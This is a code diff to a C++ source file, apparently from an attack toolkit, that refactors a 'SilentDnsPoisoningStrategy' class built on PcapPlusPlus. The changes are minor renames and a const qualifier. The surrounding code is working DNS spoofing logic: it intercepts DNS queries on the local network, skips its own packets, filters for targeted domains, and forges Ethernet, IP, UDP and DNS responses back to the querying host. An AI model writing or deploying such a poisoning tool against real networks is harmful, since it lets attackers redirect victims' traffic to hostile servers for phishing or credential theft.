@@ -33,8 +33,8 @@ void ATK::DNS::SilentDnsPoisoningStrategy::onPacketArrives(
     }
 
     // Avoid poisoning own packets
-    if (requestEthLayer->getSourceMac() == device_->getMacAddress() ||
-        requestIpLayer->getSrcIPv4Address() == device_->getIPv4Address()) {
+    if (requestEthLayer->getSourceMac() == device->getMacAddress() ||
+        requestIpLayer->getSrcIPv4Address() == device->getIPv4Address()) {
         LOG_INFO("Skipping packet from self");
         return;
     }
@@ -53,7 +53,7 @@ void ATK::DNS::SilentDnsPoisoningStrategy::onPacketArrives(
         return;
     }
 
-    std::string queriedName = dnsQuery->getName();
+    std::string const queriedName = dnsQuery->getName();
 
     // Only spoof specified domains (if none are given, spoof any)
     if (!domainsToSpoof_.empty() && domainsToSpoof_.count(queriedName) == 0) {
@@ -62,9 +62,9 @@ void ATK::DNS::SilentDnsPoisoningStrategy::onPacketArrives(
     }
 
     // Build spoofed response
-    pcpp::EthLayer ethResponse(device_->getMacAddress(),
+    pcpp::EthLayer ethResponse(device->getMacAddress(),
                                requestEthLayer->getSourceMac());
-    pcpp::IPv4Layer ipResponse(device_->getIPv4Address(),
+    pcpp::IPv4Layer ipResponse(device->getIPv4Address(),
                                requestIpLayer->getSrcIPv4Address());
     pcpp::UdpLayer udpResponse(DNS_PORT, requestUdpLayer->getSrcPort());
 
@@ -90,8 +90,8 @@ void ATK::DNS::SilentDnsPoisoningStrategy::onPacketArrives(
     responsePacket.addLayer(&dnsResponse);
     responsePacket.computeCalculateFields();
 
-    if (!device_->sendPacket(&responsePacket)) {
-        device_->stopCapture();
+    if (!device->sendPacket(&responsePacket)) {
+        device->stopCapture();
         LOG_ERROR("Failed to send spoofed DNS packet");
         throw std::runtime_error("Failed to send packet");
     }
